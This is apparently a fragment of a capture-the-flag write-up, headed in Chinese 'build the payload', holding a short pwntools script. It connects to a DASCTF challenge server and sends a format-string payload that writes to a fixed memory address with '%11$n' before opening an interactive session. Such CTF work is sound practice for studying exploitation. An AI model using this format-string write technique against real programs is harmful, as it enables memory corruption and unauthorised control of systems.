构造payload


```python
from pwn import *

r=remote("b53ab2a134a9beb9f4924beb.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="b53ab2a134a9beb9f4924beb.tcp-ctf2.dasctf.com")

x=0x0804A02C

payload=p32(x)+b"%11$n"

r.sendline(payload)

r.interactive()
```
